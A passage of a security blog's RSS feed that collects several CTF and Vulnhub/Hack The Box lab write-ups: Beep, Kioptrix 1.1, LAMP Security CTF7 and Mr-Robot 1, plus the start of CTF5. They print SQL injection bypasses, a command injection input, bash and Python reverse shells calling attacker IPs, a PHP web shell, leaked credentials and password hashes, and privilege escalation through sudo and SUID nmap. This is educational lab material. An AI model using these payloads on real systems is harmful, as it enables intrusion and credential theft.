[15:16:06] 301 -  310B  - /static  -&amp;gt;  https://10.10.10.7/static/
[15:16:07] 301 -  308B  - /lang  -&amp;gt;  https://10.10.10.7/lang/
[15:16:10] 301 -  308B  - /libs  -&amp;gt;  https://10.10.10.7/libs/
[15:16:19] 301 -  309B  - /panel  -&amp;gt;  https://10.10.10.7/panel/
[15:16:58] 301 -  311B  - /configs  -&amp;gt;  https://10.10.10.7/configs/
[15:23:39] 301 -  314B  - /recordings  -&amp;gt;  https://10.10.10.7/recordings/
[15:26:38] 301 -  313B  - /vtigercrm  -&amp;gt;  https://10.10.10.7/vtigercrm/
[15:26:42] 200 -    2KB - /
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I found vtigercrm 5.1.0:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-01-08-htb-beep/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This version is vulnerable to LFI.
With &lt;a href=&quot;https://github.com/dzonerzy/goWAPT&quot;&gt;goWAPT&lt;/a&gt; I enumerated all the files:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-01-08-htb-beep/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the /etc/passwd file we can see the user Fanis:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-01-08-htb-beep/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After some research on google about asterisk, I got the etc/asterisk/manager.conf file:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;;
; AMI - Asterisk Manager interface
;
; FreePBX needs this to be enabled. Note that if you enable it on a different IP, you need
; to assure that this can't be reached from un-authorized hosts with the ACL settings (permit/deny).
; Also, remember to configure non-default port or IP-addresses in amportal.conf.
; 
; The AMI connection is used both by the portal and the operator's panel in FreePBX.
;
; FreePBX assumes an AMI connection to localhost:5038 by default.
;
[general]
enabled = yes
port = 5038
bindaddr = 0.0.0.0
displayconnects=no ;only effects 1.6+

[admin]
secret = jEhdIekWmdjE
deny=0.0.0.0/0.0.0.0
permit=127.0.0.1/255.255.255.0
read = system,call,log,verbose,command,agent,user,config,command,dtmf,reporting,cdr,dialplan,originate
write = system,call,log,verbose,command,agent,user,config,command,dtmf,reporting,cdr,dialplan,originate

#include manager_additional.conf
#include manager_custom.conf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I used the credential admin:jEhdIekWmdjE contained in this file to log in Elastix, Vtigercrm and FreePBX.&lt;/p&gt;

&lt;p&gt;After some research on Google, I was able to upload a backdoor by using this &lt;a href=&quot;https://www.exploit-db.com/exploits/38345/&quot;&gt;vulnerability&lt;/a&gt; in vtiger crm:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-01-08-htb-beep/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With python I got a reverse shell and the user flag:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/webshell# nc -lvp 80
listening on [any] 80 ...
connect to [10.10.14.6] from beep.localdomain [10.10.10.7] 46497
sh: no job control in this shell
sh-3.2$ ls
logo.txt
sale.jpeg
vtiger-crm-logo.jpg
webshell.php
sh-3.2$ python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
bash-3.2$ cat /home/fanis/user.txt
cat /home/fanis/user.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There were different ways to get the root flag:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.2$ sudo -l
sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY&quot;

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
bash-3.2$ sudo /bin/chown -r asterisk /root
sudo /bin/chown -r asterisk /root
/bin/chown: invalid option -- r
Try `/bin/chown --help' for more information.
bash-3.2$ sudo /bin/chown -R asterisk /root
sudo /bin/chown -R asterisk /root
bash-3.2$ cat /root/root.txt
cat /root/root.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.2$ sudo nmap --interactive
sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h &amp;lt;enter&amp;gt; for help
nmap&amp;gt; !id
!id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
waiting to reap child: No child processes (10)
nmap&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bye!!!&lt;/p&gt;
</description>
        <pubDate>Sun, 07 Jan 2018 22:30:00 +0100</pubDate>
        <link>http://localhost:4000/blog/htb-beep/</link>
        <guid isPermaLink="true">http://localhost:4000/blog/htb-beep/</guid>
        
        <category>hackthebox</category>
        
        
        <category>blog</category>
        
      </item>
    
      <item>
        <title>Metasploitable3 CTF Writeup</title>
        <description>&lt;p&gt;Hello,&lt;/p&gt;

&lt;p&gt;My dear Friend &lt;a href=&quot;https://twitter.com/R3dShift23&quot;&gt;R3d&lt;/a&gt; and I partecipated to the Rapid7 Metasploitable 3 CTF as 16667 team.&lt;/p&gt;

&lt;p&gt;You can find our write-up &lt;a href=&quot;https://github.com/16667/Metasploitable-3-CTF&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2017-12-27-metasploitable3-ctf/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 27 Dec 2017 22:30:00 +0100</pubDate>
        <link>http://localhost:4000/blog/metasploitable3-ctf/</link>
        <guid isPermaLink="true">http://localhost:4000/blog/metasploitable3-ctf/</guid>
        
        <category>metasploitable</category>
        
        
        <category>blog</category>
        
      </item>
    
      <item>
        <title>Kioptrix: Level 1.1 (#2) Writeup</title>
        <description>&lt;p&gt;Hello all.&lt;/p&gt;

&lt;p&gt;You can download Kioptrix  from Vulnhub.&lt;/p&gt;

&lt;p&gt;As always I started to enumerate with nmap:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Syrion:~ syrion$ nmap -sT -sV -p 1-65535 192.168.1.26
Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-01-07 00:18 CET
Nmap scan report for 192.168.1.26
Host is up (0.0014s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind  2 (RPC #100000)
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
631/tcp  open  ipp      CUPS 1.1
788/tcp  open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On port 80 there was this vulnerable login:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2017-01-07-kioptrix-level-1-1-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By using ‘ or 1=1 — – as username I successfully logged in:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2017-01-07-kioptrix-level-1-1-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There was this “Basic Administrative Web Console”.  By giving an ip address, it performed a ping command:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2017-01-07-kioptrix-level-1-1-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nice!!! It looked like a Command Injection Vulnerability!!! I succesfully executed a “ls” command by using this input:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;;ls
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/images/2017-01-07-kioptrix-level-1-1-writeup/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I opened a reverse shell:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.24/4444 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Syrion:~ syrion$ nc -l 4444
bash: no job control in this shell
bash-3.00$ id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-3.00$ uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I noticed that this linux kernel version was vulnerable to this &lt;a href=&quot;https://www.exploit-db.com/exploits/9542/&quot;&gt;exploit&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.00$ gcc exp.c -o exp
bash-3.00$ ./exp
sh: no job control in this shell
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It was done!&lt;/p&gt;

&lt;p&gt;Good bye!&lt;/p&gt;
</description>
        <pubDate>Sat, 07 Jan 2017 22:30:00 +0100</pubDate>
        <link>http://localhost:4000/blog/kioptrix-level-1-1-writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/blog/kioptrix-level-1-1-writeup/</guid>
        
        <category>vulnhub</category>
        
        
        <category>blog</category>
        
      </item>
    
      <item>
        <title>Lamp Security CTF7 Writeup</title>
        <description>&lt;p&gt;Hello everyone. &lt;a href=&quot;http://www.vulnhub.com/entry/lampsecurity-ctf7,86/&quot;&gt;LAMP Security CTF7&lt;/a&gt; was created by &lt;a href=&quot;http://hello%20everyone.%20lamp%20security%20ctf7%20is%20an%20easy%20and%20funny%20ctf%20created%20by%20mad%20irish/&quot;&gt;Mad Irish&lt;/a&gt;. You can find it on &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;Vulnub&lt;/a&gt; or on &lt;a href=&quot;https://www.root-me.org/&quot;&gt;root-me&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Ok let’s start to enumerate the services:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syrion@backbox:~$ nmap -sT -sV -p 1-65535 ctf07.root-me.org

PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 5.3 (protocol 2.0)
80/tcp    open   http        Apache httpd 2.2.15 ((CentOS))
139/tcp   open   netbios-ssn Samba smbd 3.X (workgroup: MYGROUP)
901/tcp   open   http        Samba SWAT administration server
5900/tcp  closed vnc
8080/tcp  open   http        Apache httpd 2.2.15 ((CentOS))
10000/tcp open   http        MiniServ 1.610 (Webmin httpd)
Device type: general purpose|storage-misc|broadband router|media device|WAP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I ran dirsearch and in the meanwhile I seen the web site on port 80:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2017-01-06-lamp-security-ctf7-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On port 8080 there was this login:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2017-01-06-lamp-security-ctf7-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The login was vulneable to SQL Injection. I logged in with ‘ or 1=1 — -. There was a kind of CMS:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2017-01-06-lamp-security-ctf7-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I uploaded a shell by creating a new reading:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2017-01-06-lamp-security-ctf7-writeup/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Before that, Dirsearch showed me the directory with all the uploaded files:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2017-01-06-lamp-security-ctf7-writeup/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok the shell worked:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2017-01-06-lamp-security-ctf7-writeup/img6.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I used this python payload to open a reverse shell:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,
socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4444));os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call
([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And it worked:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syrion@backbox:~$ nc -lvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [212.83.142.84] port 4444 [tcp/*] accepted (family 2, sport 57758)
sh: no job control in this shell
sh-4.1$ python -c “import pty;pty.spawn(‘/bin/bash’);”
python -c “import pty;pty.spawn(‘/bin/bash’);”
bash-4.1$ id
id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After some local enumerations, I found the credentials of mysql in a php page, so I accessed to mysql and I found some interesting credentials:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.1$ mysql -u root
mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 26
Server version: 5.1.66 Source distribution
Copyright (c) 2000, 2012, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type ‘help;’ or ‘\h’ for help. Type ‘\c’ to clear the current input statement.

mysql&amp;gt; show databases;
show databases;
+——————–+
| Database           |
+——————–+
| information_schema |
| mysql              |
| roundcube          |
| website            |
+——————–+
4 rows in set (0.00 sec)

mysql&amp;gt; use website;
use website;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&amp;gt; show tables;
show tables;
+——————-+
| Tables_in_website |
+——————-+
| contact           |
| documents         |
| hits              |
| log               |
| newsletter        |
| payment           |
| trainings         |
| trainings_x_users |
| users             |
+——————-+
9 rows in set (0.00 sec)

mysql&amp;gt; select username,password from users;
select username,password from users;
+——————————-+———————————-+
| username                      | password                         |
+——————————-+———————————-+
| brian@localhost.localdomain   | e22f07b17f98e0d9d364584ced0e3c18 |
| john@localhost.localdomain    | 0d9ff2a4396d6939f80ffe09b1280ee1 |
| alice@localhost.localdomain   | 2146bf95e8929874fc63d54f50f1d2e3 |
| ruby@localhost.localdomain    | 9f80ec37f8313728ef3e2f218c79aa23 |
| leon@localhost.localdomain    | 5d93ceb70e2bf5daa84ec3d0cd2c731a |
| julia@localhost.localdomain   | ed2539fe892d2c52c42a440354e8e3d5 |
| michael@localhost.localdomain | 9c42a1346e333a770904b2a2b37fa7d3 |
| bruce@localhost.localdomain   | 3a24d81c2b9d0d9aaf2f10c6c9757d4e |
| neil@localhost.localdomain    | 4773408d5358875b3764db552a29ca61 |
| charles@localhost.localdomain | b2a97bcecbd9336b98d59d9324dae5cf |
| foo@bar.com                   | 4cb9c8a8048fd02294477fcb1a41191a |
| test@nowhere.com              | 098f6bcd4621d373cade4e832627b4f6 |
+——————————-+———————————-+
12 rows in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I used Crackstation to crack all the hashes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2017-01-06-lamp-security-ctf7-writeup/img7.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At this point I tried to become the user brian:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.1$ su brian
su brian
Password: my2cents
[brian@localhost inc]$ id
id
uid=501(brian) gid=501(brian) groups=501(brian),10(wheel),500(webdev),512(admin) context=system_u:system_r:httpd_t:s0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The user Brian was a sudo user, and I become root:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[brian@localhost inc]$ sudo su
sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

#1) Respect the privacy of others.
#2) Think before you type.
#3) With great power comes great responsibility.

[sudo] password for brian: my2cents

[root@localhost inc]# id
id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:httpd_t:s0
[root@localhost inc]# cat /passwd
cat /passwd
688986705024f447914a24e0dd903b39
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bye!&lt;/p&gt;
</description>
        <pubDate>Fri, 06 Jan 2017 22:30:00 +0100</pubDate>
        <link>http://localhost:4000/blog/lamp-security-ctf7-writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/blog/lamp-security-ctf7-writeup/</guid>
        
        <category>vulnhub</category>
        
        
        <category>blog</category>
        
      </item>
    
      <item>
        <title>Mr-Robot: 1 Writeup</title>
        <description>&lt;p&gt;Hello Friend,&lt;/p&gt;

&lt;p&gt;This is my writeup for the CTF &lt;a href=&quot;http://www.vulnhub.com/entry/mr-robot-1,151/&quot;&gt;Mr-Robot 1&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I ran nmap:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sT -sV -Pn 192.168.1.17
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;-sT: full TCP scan (complete Three-Way Handshake)&lt;/li&gt;
  &lt;li&gt;-sV: version of the services&lt;/li&gt;
  &lt;li&gt;-Pn: skip host discovery (I had problems with ICMP echo request packets)&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-10-22 18:40 CEST
Nmap scan report for linux.homenet.telecomitalia.it (192.168.1.17)
Host is up (0.0014s latency).
Not shown: 997 filtered ports
PORT STATE SERVICE VERSION
22/tcp closed ssh
80/tcp open http Apache httpd
443/tcp open ssl/http Apache httpd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I ran another nmap with “-p 1-65535” parameters on all ports, but nothing changed.&lt;/p&gt;

&lt;p&gt;The website was the same on port 80 and 443:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016-12-21-mr-robot-1-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It was an animated console on a fsociety machine 😛&lt;/p&gt;

&lt;p&gt;But… look at this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016-12-21-mr-robot-1-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;First Key :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;073403c8a58a1f80d943455fb30724b9
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There was a wordpress blog on the website. I tried to enumerate users with wpscan, but it didn’t work. After some attempts, I found that ‘eliot’ was a valid username. I ran wpscan to bruteforce the wordpress login for user ‘eliot’ with the dictionary file ‘fsocity.dic’. The password was:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ER28–0652
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After logged in, I uploaded a php shell:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php passthru($_GET[“cmd”]); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016-12-21-mr-robot-1-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I got a reverse shell on netcat by using this payload:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.1.17/wp-content/uploads/2016/10/shell.php?cmd=python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect((“10.0.0.1”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I spawned a TTY shell:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/bin/sh: 0: can’t access tty; job control turned off
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
$ python -c “import pty;pty.spawn(‘/bin/bash’);”
daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-content/uploads/2016/10$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ok I found this:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;daemon@linux:/home/robot$ ls -l
ls -l
total 8
-r——– 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r–r– 1 robot robot 39 Nov 13  2015 password.raw-md5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I didn’t have permission to read the second key but I found something in the password.raw-md5 file:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root:c3fcd3d76192e4007dfb496cca67e13b
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I used Crack Station and I got the second key:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root:abcdefghijklmnopqrstuvwxyz

daemon@linux:/home/robot$ su – robot
su – robot
Password: abcdefghijklmnopqrstuvwxyz
$ id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After some local enumeration, I found nmap with SUID set to root on the system. This &lt;a href=&quot;http://www.exploit-db.com/papers/18168/&quot;&gt;paper&lt;/a&gt; explains how to get a root shell:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;robot@linux:/usr/local/bin$ ls -l
ls -l
total 496
-rwsr-xr-x 1 root root 504736 Nov 13  2015 nmap
robot@linux:/usr/local/bin$ nmap –interactive
nmap –interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode — press h &amp;lt;enter&amp;gt; for help
nmap&amp;gt; ! id
! id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
waiting to reap child : No child processes
nmap&amp;gt; ! ls /root/
! ls /root/
firstboot_done    key-3-of-3.txt
waiting to reap child : No child processes
nmap&amp;gt; ! cat /root/key-3-of-3.txt
! cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Goodbye friend.&lt;/p&gt;
</description>
        <pubDate>Wed, 21 Dec 2016 22:00:00 +0100</pubDate>
        <link>http://localhost:4000/blog/mr-robot-1-writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/blog/mr-robot-1-writeup/</guid>
        
        <category>vulnhub</category>
        
        
        <category>blog</category>
        
      </item>
    
      <item>
        <title>Lamp Security CTF5 Writeup</title>
        <description>&lt;p&gt;LAMP security CTF5 is a funny and easy CTF with a lot of vulnerabilities. You can find info about it on &lt;a href=&quot;https://vulnhub.com&quot;&gt;Vulnhub.com&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I ran nmap to see which services were open:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Syrion:~ syrion$ sudo nmap -sT -sV -O ctf04.root-me.org
Password:

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-10-13 22:39 CEST
Nmap scan report for ctf04.root-me.org (212.129.29.186)
Host is up (0.078s latency).
Not shown: 990 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 4.7 (protocol 2.0)
25/tcp   open  smtp        Sendmail 8.14.1/8.14.1
80/tcp   open  http        Apache httpd 2.2.6 ((Fedora))
110/tcp  open  pop3        ipop3d 2006k.101
111/tcp  open  rpcbind     2-4 (RPC #100000)
